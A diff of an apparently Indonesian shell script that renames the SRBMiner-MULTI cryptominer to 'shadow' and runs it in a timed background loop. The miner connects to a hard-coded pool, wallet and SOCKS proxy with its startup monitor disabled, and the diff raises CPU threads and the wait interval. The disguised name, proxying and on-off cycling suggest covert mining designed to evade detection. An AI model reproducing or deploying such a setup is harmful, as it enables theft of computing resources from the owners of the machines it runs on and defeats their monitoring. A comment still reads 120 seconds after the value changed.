@@ -33,11 +33,11 @@
 mv SRBMiner-MULTI shadow
 
 # Nama aplikasi
-APP="./shadow --algorithm xelishashv2_pepew --disable-gpu --pool 103.249.70.7:5778 --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --worker cpuXidx --password c=LTC,ID=8Xpepew --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 4"
+APP="./shadow --algorithm xelishashv2_pepew --disable-gpu --pool 103.249.70.7:5778 --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --worker cpuXidx --password c=LTC,ID=8Xpepew --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 8"
 
 # Interval waktu dalam detik
 RUN_TIME=60  # 60 detik
-WAIT_TIME=120  # 120 detik
+WAIT_TIME=180  # 120 detik
 
 # Loop tak terbatas
 while true; do
